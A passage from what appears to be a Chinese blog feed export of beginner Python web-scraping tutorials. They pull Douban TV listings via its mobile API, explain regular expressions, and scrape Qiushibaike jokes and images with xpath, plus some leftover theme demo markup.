<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="comment">#引用pprint模块，使打印输出结果更美观</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://m.douban.com/tv/american&quot;</span>&#125; <span class="comment">#请求头必须把referer字段加上，否则无法抓取结果</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://m.douban.com/rexxar/api/v2/subject_collection/tv_american/items?os=android&amp;for_mobile=1&amp;start=0&amp;count=18&amp;loc_id=108288&quot;</span></span><br><span class="line">r = requests.get(url,headers=headers)</span><br><span class="line">json_str = r.content.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(json_str)) <span class="comment">#抓取结果的格式是json字符串</span></span><br><span class="line"></span><br><span class="line">json_str2 = json.loads(json_str) <span class="comment">#将json字符串转换为python数据类型</span></span><br><span class="line"><span class="comment"># pprint(json_str2) #输出结果显示更美观，pretty print</span></span><br><span class="line"><span class="comment"># print(type(json_str2)) #json字符串转换为了字典类型</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;douban.json&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#以json格式将爬取结果保存到本地</span></span><br><span class="line">    f.write(json.dumps(json_str2,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>)) <span class="comment">#json.dumps可以设置参数ensure_ascii使中文正常显示，indent参数（作用就是格式化输出结果）使结果显示更美观；文件写入操作无法写入字典，需要把字典转换为字符串类型</span></span><br><span class="line">    <span class="comment"># f.write(str(json_str2)) #也可以将字典强制转换为字符串类型，但是这样无法对结果进行格式化</span></span><br><span class="line">    <span class="comment"># f.write(json_str) #如果直接把获取到的字符串写入文件，中文无法正常显示</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;douban.json&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#格式化之后的json字符串，仍然可以转换为字典</span></span><br><span class="line">    result1 = f.read() <span class="comment">#读取格式化之后的json字符串</span></span><br><span class="line">    result2 = json.loads(result1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(result2)) <span class="comment">#仍然可以转换为字典</span></span><br><span class="line">    <span class="built_in">print</span>(result2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;douban.json&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    result3 = json.load(f) <span class="comment">#使用json.load可以直接读取类文件对象的数据</span></span><br><span class="line">    <span class="built_in">print</span>(result3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(result3))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;douban1.json&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(result2,f,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>) <span class="comment">#使用json.dump可以直接将字典写入类文件对象。这里的result2就是字典类型的数据</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>json.dumps</code>就是个格式化高手啊。pprint模块可以美化输出界面的显示效果，使用之前，先引用模块。 json字符串里面的字符串都是用双引号引起来的。<br><code>json.dump</code>可以直接把python数据类型写入类文件对象，<code>json.load</code>可以直接读取类文件对象的数据。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>json格式的数据处理</tag>
        <tag>文件读写操作</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之正则表达式匹配数据</title>
    <url>//posts/ZH-CN/Python_Spider_Reg_Match.html</url>
    <content><![CDATA[<h2 id="正则表达式是什么"><a href="#正则表达式是什么" class="headerlink" title="正则表达式是什么"></a>正则表达式是什么</h2><p>正则表达式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个”规则字符串”，这个”规则字符串”用来表达对字符串的一种过滤逻辑。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><ul>
<li>re.compile（编译）</li>
<li>pattern.match（从头找一个）</li>
<li>pattern.search（找一个）</li>
<li>pattern.findall（找所有）</li>
<li>pattern.sub（替换）</li>
</ul>
<p>编译就相当于把规则拷贝一个副本到本地，待匹配的内容较多时，使用预先编译的规则，匹配速度更快。<br>使用方法：</p>
<ul>
<li>第一步：导入re模板<code>import re</code>，编译规则 <code>pattern=re.compile(&quot;规则&quot;,re.S)</code></li>
<li>第二步：使用编译的规则 <code>pattern.findall(&quot;待匹配字符串&quot;)</code></li>
<li><em>注意：匹配规则、匹配模式，都要在编译的时候定义好。使用编译规则的时候，无法更改匹配模式。</em></li>
</ul>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb49fxokf3j30h40este4.jpg" alt="image.png"></p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><ul>
<li>re.S模式，等价于re.DOTALL<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb49i5c8itj30qu072jro.jpg" alt="image.png"></li>
<li>\d(数字)，\w（字母），\s（空格）<br>\D（非数字），\W（非字母），\S（非空格）<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb49m65pgwj30sr0jajst.jpg" alt="image.png"></li>
<li>贪婪匹配vs非贪婪匹配<br>贪婪匹配：顾名思义，匹配更多字符串，只返回一个结果。<br>非贪婪匹配：一旦匹配上，就立刻返回结果，继续匹配下一个。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb49t820a2j317o0jl76u.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb49uzjts2j317t07xdh5.jpg" alt="image.png"></li>
<li>re.sub替换字符串<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb49wpisidj30o0067wel.jpg" alt="image.png"></li>
<li>re.compile编译<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb49zxh1pfj30oo0lhabp.jpg" alt="image.png"></li>
<li>原始字符串r<br>原始字符串r的作用，就是去掉转义的影响，标记了r，表示这个字符串里面不含有转义字符，你看到的就是真相，不需要转义。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4a35lydsj30x107rmxp.jpg" alt="image.png"></li>
<li>截取匹配的内容<br>返回结果是括号内匹配的内容。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4a55nm4nj30qy05haaf.jpg" alt="image.png"></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本的语法并不难，但是这些基本的语法可以组成复杂的匹配规则。基础打扎实先~</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>正则表达式使用</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之爬取糗事百科段子</title>
    <url>//posts/ZH-CN/Python_Spider_Qiubai_Funny.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>复习<a href="https://dana5haw.com/2020/01/22/python爬虫实例之爬取贴吧页面/">贴吧爬取的方法</a>，熟练掌握数据提取方式。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>还是基本思路。url的规律很简单，总共就两页内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第1页：http://www.qiushibaike.cc/?&amp;p=1</span><br><span class="line">第2页：http://www.qiushibaike.cc/?&amp;p=2</span><br></pre></td></tr></table></figure>
<h3 id="使用xpath提取各字段的值"><a href="#使用xpath提取各字段的值" class="headerlink" title="使用xpath提取各字段的值"></a>使用xpath提取各字段的值</h3><h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5gc3ys96j31f60u04ew.jpg" alt="image.png"></p>
<h4 id="提取段子标题"><a href="#提取段子标题" class="headerlink" title="提取段子标题"></a>提取段子标题</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5ggods86j31f60u07kj.jpg" alt="image.png"></p>
<h4 id="提取作者名字"><a href="#提取作者名字" class="headerlink" title="提取作者名字"></a>提取作者名字</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5gkh7chfj31f60u0h1y.jpg" alt="image.png"></p>
<h4 id="提取段子内容和发表时间"><a href="#提取段子内容和发表时间" class="headerlink" title="提取段子内容和发表时间"></a>提取段子内容和发表时间</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5gltpgrgj31f60u04ev.jpg" alt="image.png"></p>
<h4 id="提取点赞数👍和点踩数👎"><a href="#提取点赞数👍和点踩数👎" class="headerlink" title="提取点赞数👍和点踩数👎"></a>提取点赞数👍和点踩数👎</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5gpci0yrj31f60u0171.jpg" alt="image.png"></p>
<h4 id="提取icon图片的url"><a href="#提取icon图片的url" class="headerlink" title="提取icon图片的url"></a>提取icon图片的url</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5gucl1kcj31f60u0177.jpg" alt="image.png"></p>
<h4 id="提取发表图片的url"><a href="#提取发表图片的url" class="headerlink" title="提取发表图片的url"></a>提取发表图片的url</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5gw2od9vj31f60u0asf.jpg" alt="image.png"></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qiubai</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url_temp = <span class="string">&quot;http://www.qiushibaike.cc/?&amp;p=&#123;&#125;&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url_list</span>(<span class="params">self</span>):</span> <span class="comment">#获取url列表</span></span><br><span class="line">        url_list = [self.url_temp.<span class="built_in">format</span>(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># print(url_list)</span></span><br><span class="line">        <span class="keyword">return</span> url_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        response = requests.get(url,headers=self.headers)</span><br><span class="line">        html_str = response.content.decode()</span><br><span class="line">        <span class="keyword">return</span> html_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_photo_url</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        response = requests.get(url,headers=self.headers)</span><br><span class="line">        photo_byt = response.content</span><br><span class="line">        <span class="keyword">return</span> photo_byt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content_list</span>(<span class="params">self,html_str</span>):</span> <span class="comment">#&lt;div&gt;标签分组</span></span><br><span class="line">        content_list = []</span><br><span class="line">        html_element = etree.HTML(html_str)</span><br><span class="line">        div_list = html_element.xpath(<span class="string">&quot;//div[@class=&#x27;block untagged&#x27;]&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> div <span class="keyword">in</span> div_list:</span><br><span class="line">            item = &#123;&#125;</span><br><span class="line">            item[<span class="string">&quot;title&quot;</span>] = div.xpath(<span class="string">&quot;.//a[contains(@id,&#x27;title&#x27;)]/text()&quot;</span>)[<span class="number">0</span>] <span class="comment">#提取段子标题</span></span><br><span class="line">            item[<span class="string">&quot;user&quot;</span>] = div.xpath(<span class="string">&quot;.//img/@alt&quot;</span>)[<span class="number">0</span>] <span class="comment">#提取作者名字</span></span><br><span class="line">            item[<span class="string">&quot;content&quot;</span>] = div.xpath(<span class="string">&quot;.//div[@class=&#x27;content&#x27;]/p/text()|.//div[@class=&#x27;content&#x27;]/text()&quot;</span>) <span class="comment">#提取段子内容。这里有个知识点，xpath中使用竖线表示【或】，就是这两种匹配方式都对，用在提取的字段需要使用多种提取方式的场景</span></span><br><span class="line">            item[<span class="string">&quot;time&quot;</span>] = div.xpath(<span class="string">&quot;.//div[@class=&#x27;content&#x27;]/@title&quot;</span>)[<span class="number">0</span>] <span class="comment">#提取发表时间</span></span><br><span class="line">            item[<span class="string">&quot;good&quot;</span>] = div.xpath(<span class="string">&quot;.//div[@class=&#x27;up&#x27;]/a/text()&quot;</span>)[<span class="number">0</span>] <span class="comment">#提取点赞数👍</span></span><br><span class="line">            item[<span class="string">&quot;bad&quot;</span>] = div.xpath(<span class="string">&quot;.//div[@class=&#x27;down&#x27;]/a/text()&quot;</span>)[<span class="number">0</span>]  <span class="comment">#提取点踩数👎</span></span><br><span class="line">            item[<span class="string">&quot;icon_url&quot;</span>] = div.xpath(<span class="string">&quot;.//div[@style=&#x27;float:right;&#x27;]/img/@src&quot;</span>)[<span class="number">0</span>] <span class="comment">#提取icon图片</span></span><br><span class="line">            item[<span class="string">&quot;photo_url&quot;</span>] = div.xpath(<span class="string">&quot;.//div[@class=&#x27;thumb&#x27;]/img/@src&quot;</span>)[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(div.xpath(<span class="string">&quot;.//div[@class=&#x27;thumb&#x27;]/img/@src&quot;</span>))&gt;<span class="number">0</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            content_list.append(item)</span><br><span class="line">        <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_content</span>(<span class="params">self,content_list,num</span>):</span></span><br><span class="line">        file_path = <span class="string">&quot;第&#123;&#125;页.json&quot;</span>.<span class="built_in">format</span>(num)</span><br><span class="line">        <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(json.dumps(content,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_icon</span>(<span class="params">self,icon_byt,num</span>):</span></span><br><span class="line">        file_path = <span class="string">&quot;icon第&#123;&#125;张.jpg&quot;</span>.<span class="built_in">format</span>(num)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(icon_byt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_photo</span>(<span class="params">self,photo_byt,num</span>):</span></span><br><span class="line">        file_path = <span class="string">&quot;photo第&#123;&#125;张.jpg&quot;</span>.<span class="built_in">format</span>(num)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(photo_byt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment">#1. 获取url</span></span><br><span class="line">        url_list = self.get_url_list()</span><br><span class="line">        icon_url_list = [] <span class="comment">#初始化icon列表</span></span><br><span class="line">        photo_url_list = [] <span class="comment">#初始化photo列表</span></span><br><span class="line">        content_num = <span class="number">0</span></span><br><span class="line">        <span class="comment">#2. 发送请求，获取响应</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            html_str = self.parse_url(url)</span><br><span class="line">            <span class="comment">#3. 提取数据</span></span><br><span class="line">            content_list = self.get_content_list(html_str) <span class="comment">#获取段子内容列表</span></span><br><span class="line">            page_num = url_list.index(url) <span class="comment">#页码数（从0开始算）</span></span><br><span class="line">            self.save_content(content_list,page_num+<span class="number">1</span>) <span class="comment">#保存段子内容</span></span><br><span class="line">            <span class="keyword">for</span> content <span class="keyword">in</span> content_list:                   </span><br><span class="line">                content_num = content_list.index(content)</span><br><span class="line">                icon_url_list.append(content_list[content_num][<span class="string">&quot;icon_url&quot;</span>]) <span class="comment">#获取icon_url列表</span></span><br><span class="line">                <span class="comment"># pprint(icon_url_list)    </span></span><br><span class="line">                icon_num = <span class="built_in">len</span>(icon_url_list) <span class="comment">#icon图片的序号       </span></span><br><span class="line">                icon_byt = self.parse_photo_url(icon_url_list[icon_num-<span class="number">1</span>]) <span class="comment">#发送请求，获取响应</span></span><br><span class="line">                self.save_icon(icon_byt,icon_num) <span class="comment">#保存icon图片</span></span><br><span class="line">                <span class="keyword">while</span> content_list[content_num][<span class="string">&quot;photo_url&quot;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="comment">#当photo_url字段的值不为空时，提取photo_url的值</span></span><br><span class="line">                    photo_url_list.append(content_list[content_num][<span class="string">&quot;photo_url&quot;</span>]) <span class="comment">#获取photo_url列表</span></span><br><span class="line">                    photo_num = <span class="built_in">len</span>(photo_url_list) <span class="comment">#发表图片的序号</span></span><br><span class="line">                    photo_byt = self.parse_photo_url(photo_url_list[photo_num-<span class="number">1</span>]) <span class="comment">#发送请求，获取响应</span></span><br><span class="line">                    <span class="comment"># pprint(photo_url_list)</span></span><br><span class="line">                    self.save_photo(photo_byt,photo_num) <span class="comment">#保存发表图片</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#4. 保存数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_qiubai = qiubai()</span><br><span class="line">    my_qiubai.run()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>和上一篇做法几乎一样，这篇是自我更正版本。上一篇获取icon图片和发表图片的代码中数学关系不对，由于爬的内容太多，没注意观察，其实爬的结果不对，图片的序号不正确。<br>还是不和数学计数的过程死磕，要把序号和图片url的顺序对应起来，可以换个方式来做。获取url列表的长度，这个url列表元素的个数减去1就是url列表元素对应的下标值。通过这个方法，url链接和序号就对应起来了，自己不会数数，就让len()函数帮忙数呗，这个函数总不会数错吧。其实就是很简单的一个思路，把列表的元素个数和元素下标值对应起来，这样就不用去想计数的过程了。就是偷懒才让程序更准确。<br>使用append方式添加列表元素，每增加一个列表元素，列表返回的元素个数就加一。描述起来很简单，就是要学会灵活使用。<br>拿不准xpath语句有没有写错，就在浏览器里面用xpath helper过一遍。否则调试程序的时候出现一堆xpath语法报错或者是提取不到数据，排查问题的过程就很费时间。</p>
<h2 id="有个小问题"><a href="#有个小问题" class="headerlink" title="有个小问题"></a>有个小问题</h2><p>目前段位不够。用xpath怎么把这几条被<code>&lt;p&gt;</code>标签分隔的文本，合并显示，只输出一个结果。要正确地提取这段段子，并且使得输出结果是一个字符串，我现在只会用正则来做。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5l3awndij31f60u0n5m.jpg" alt="image.png"></p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>找到方法啦，xpath直接打印<code>&lt;p&gt;</code>标签的内容就行了。这时候，每个<code>&lt;p&gt;</code>标签的文本都存在列表里面，一个文本段落就对应一个列表元素，取数据的时候取整个列表，就能够把整段内容获取下来。</p>
<ul>
<li>当字段值需要用到多种提取方式，就要使用竖线把多个提取规则写到xpath<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5li4xzvxj31f60u0arl.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5lk5q5uyj31f60u014c.jpg" alt="image.png"><br>path规则：<code>item[&quot;content&quot;] = div.xpath(&quot;.//div[@class=&#39;content&#39;]/p/text()|.//div[@class=&#39;content&#39;]/text()&quot;)</code><div class="note success">
            <p>test</p>
          </div>
I heard the echo, <span class="label default">from the valleys and the heart</span></li>
</ul>
<a class="btn" href="#"><i class="fa fa-home"></i>文本 & 图标</a>
<a class="btn" href="#"><i class="fa fa-fa fa-address-book"></i>文本 & 大图标 (固定宽度)</a>
<div class="tabs" id="tab标签列表"><ul class="nav-tabs"><li class="tab active"><a href="#tab标签列表-1">标签页1</a></li><li class="tab"><a href="#tab标签列表-2">标签页2</a></li><li class="tab"><a href="#tab标签列表-3">标签页3</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tab标签列表-1"><p>  标签页1文本内容</p></div><div class="tab-pane" id="tab标签列表-2"><p>  标签页2文本内容</p></div><div class="tab-pane" id="tab标签列表-3"><p>  标签页3文本内容</p></div></div></div>
<center>
  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=167977&auto=1&height=66"></iframe>
</center>
<blockquote class="blockquote-center"><p>blah blah blah</p>
</blockquote>
<details><summary>点击显/隐内容</summary>
<p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此处为要显示/隐的内容，亦可在此添加代码块，注意上下各空一行，</span><br></pre></td></tr></table></figure>
</p>
</details>]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>爬取糗事百科的段子</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之爬取豆瓣上的日剧</title>
    <url>//posts/ZH-CN/Python_Spider_Douban_Jp.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把豆瓣的日剧爬取到本地，需要标题，电视剧类型，剧评这三个信息。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><ul>
<li>获取url</li>
<li>发送请求，获取响应</li>
<li>提取数据</li>
<li>保存数据</li>
</ul>
<h3 id="获取url"><a href="#获取url" class="headerlink" title="获取url"></a>获取url</h3><p>观察可知，目标数据所在的url。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4g32374aj31f60u044q.jpg" alt="image.png"></p>
<h3 id="发送请求，获取响应"><a href="#发送请求，获取响应" class="headerlink" title="发送请求，获取响应"></a>发送请求，获取响应</h3><p>注意，这条请求必须把Referer参数带上，才能够正常获取响应数据。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4g4fdei9j31f60u0tev.jpg" alt="image.png"></p>
<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>使用<code>json.loads</code>方法读取数据，先提取包含电视剧信息的整块数据。通过遍历列表，提取每部剧的详细信息。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4g96w3pcj31f60u0gsa.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4gao6ovdj31f60u0grk.jpg" alt="image.png"></p>
<h3 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h3><p>使用<code>json.dumps</code>方式写入数据，每个字段信息后面加上空格，每部剧的信息后面加上换行符，美化输出格式。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4gclrncyj311u0llju5.jpg" alt="image.png"></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">doubannew</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url = <span class="string">&quot;https://m.douban.com/rexxar/api/v2/subject_collection/tv_japanese/items?os=windows&amp;for_mobile=1&amp;start=0&amp;count=18&amp;loc_id=108288&amp;_=0&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://m.douban.com/tv/japanese&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url,headers</span>):</span></span><br><span class="line">        response = requests.get(url,headers=headers)</span><br><span class="line">        <span class="comment"># print(response.content.decode())</span></span><br><span class="line">        <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content_list</span>(<span class="params">self,html_str</span>):</span></span><br><span class="line">        json_str = json.loads(html_str)</span><br><span class="line">        content_list = json_str[<span class="string">&quot;subject_collection_items&quot;</span>] <span class="comment">#获取主要数据</span></span><br><span class="line">        <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_content</span>(<span class="params">self,content_list</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;doubannew.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> content <span class="keyword">in</span> content_list: <span class="comment">#遍历数据，提取每部剧的详细信息</span></span><br><span class="line">                title = content[<span class="string">&quot;title&quot;</span>] <span class="comment">#提取标题</span></span><br><span class="line">                info = content[<span class="string">&quot;info&quot;</span>] <span class="comment">#提取电视剧的类型</span></span><br><span class="line">                recommend_comment = content[<span class="string">&quot;recommend_comment&quot;</span>] <span class="comment">#提取剧评</span></span><br><span class="line">                <span class="comment"># pprint(recommend_comment)</span></span><br><span class="line">                <span class="comment"># pprint(title)</span></span><br><span class="line">                f.write(title)</span><br><span class="line">                f.write(<span class="string">&quot; &quot;</span>)</span><br><span class="line">                f.write(info)</span><br><span class="line">                f.write(<span class="string">&quot; &quot;</span>)</span><br><span class="line">                f.write(recommend_comment)</span><br><span class="line">                f.write(<span class="string">&quot;\n\n&quot;</span>) <span class="comment">#为了输出格式更好看</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span> <span class="comment">#实现主逻辑</span></span><br><span class="line">        <span class="comment">#1. 获取url</span></span><br><span class="line">        <span class="comment">#2. 发送请求，获取响应</span></span><br><span class="line">        html_str = self.parse_url(self.url,headers=self.headers)</span><br><span class="line">        <span class="comment">#3. 提取数据</span></span><br><span class="line">        content_list = self.get_content_list(html_str)</span><br><span class="line">        <span class="comment">#4. 保存数据</span></span><br><span class="line">        self.save_content(content_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_douban = doubannew()</span><br><span class="line">    my_douban.run()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这只是很初级的方法。并且只抓取了20部剧的信息。如果要抓取所有的电视剧，还要进一步学习，主要是剧的总数和url之间的数学关系，怎么使用代码表现出来。<br>先这样，下次有兴趣了继续。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>json数据提取</tag>
        <tag>爬取豆瓣日剧</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之爬取贴吧页面</title>
    <url>//posts/ZH-CN/Python_Spider_Forum.html</url>
